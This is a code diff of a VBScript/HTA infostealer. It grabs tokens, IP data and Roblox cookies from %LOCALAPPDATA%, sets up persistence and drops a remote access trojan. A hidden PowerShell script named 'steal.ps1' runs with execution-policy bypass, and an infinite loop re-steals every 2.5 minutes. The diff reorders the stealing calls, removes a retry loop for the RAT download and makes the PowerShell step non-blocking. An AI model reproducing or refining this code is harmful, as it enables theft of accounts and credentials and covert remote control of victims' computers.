@@ -21,19 +21,12 @@ Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal1.txt"
 Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
 ' --- Initial Grab ---
-Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
+Call DropRAT
+Call GrabTokens
 Call PostFullRobloxUI
-
-' --- Download & Execute RAT 2 Times ---
-Dim downloadAttempt
-For downloadAttempt = 1 To 2
-    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 10181046)
-    Call DropRAT
-    If downloadAttempt < 2 Then Call SleepMinutes(2)
-Next
 
 ' --- INFINITE Re-grab chain (every 2.5 minutes) ---
 Dim runCount
@@ -51,7 +44,7 @@ Loop
 
 window.close()
 
-' --- ADDED: FULL ROBLOX UI FROM SCREENSHOT ---
+' --- FULL ROBLOX UI FROM SCREENSHOT ---
 Sub PostFullRobloxUI()
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -295,7 +288,7 @@ Sub GrabTokens()
     
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     fso.DeleteFile psf, True
     
     Dim tf: tf = TmpFile("steal_result.txt")
